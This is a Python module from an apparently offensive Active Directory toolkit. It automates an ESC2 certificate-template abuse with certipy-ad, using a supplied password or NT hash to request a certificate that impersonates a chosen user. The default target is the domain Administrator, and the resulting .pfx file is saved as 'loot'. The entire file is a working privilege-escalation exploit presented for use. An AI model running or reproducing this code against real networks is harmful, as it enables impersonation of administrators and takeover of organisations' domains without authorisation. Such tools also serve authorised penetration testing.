import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def abuse_esc2(session, template_name):
    print(blue("[>] ESC2: Abusing certificate templates with weak EKUs that allow client authentication."))
    print(yellow("[*] This allows an attacker to impersonate users or services by requesting a certificate for them."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] Invalid CA name in session metadata."))
        return

    output_file = f"esc2_{template_name}.pfx"
    default_upn = f"Administrator@{session.domain}"
    upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn

    # === Support both password and NT hash
    if session.hash:
        auth = ["-u", f"{session.username}@{session.domain}", "-hashes", session.hash]
    elif session.password:
        auth = ["-u", f"{session.username}@{session.domain}", "-p", session.password]
    else:
        print(red("[-] No credentials provided (password or hash)."))
        return

    cmd = [
        "certipy-ad", "req",
        *auth,
        "-dc-ip", session.dc_ip,
        "-template", template_name,
        "-ca", ca_name,
        "-out", output_file,
        "-upn", upn
    ]

    print(blue(f"[*] Requesting certificate from CA '{ca_name}' using template '{template_name}'..."))
    command_str = " ".join(cmd)
    stdout, stderr = run_command(command_str)
    print(stdout.strip() or stderr.strip())

    if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
        print(red("[-] Certificate request failed or file not valid."))
        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
        print(yellow(f"[*] Command executed: {command_str}"))
        return

    with open(output_file, "rb") as f:
        cert_data = f.read()
    save_loot(output_file, cert_data, binary=True)

    print(green(f"[+] ESC2 abuse complete. Certificate saved to loot/{output_file}"))
    print(green(f"[+] UPN used: {upn}"))
    print(green("[+] Certificate request successful!"))
    print(yellow(f"[*] Command executed: {command_str}"))
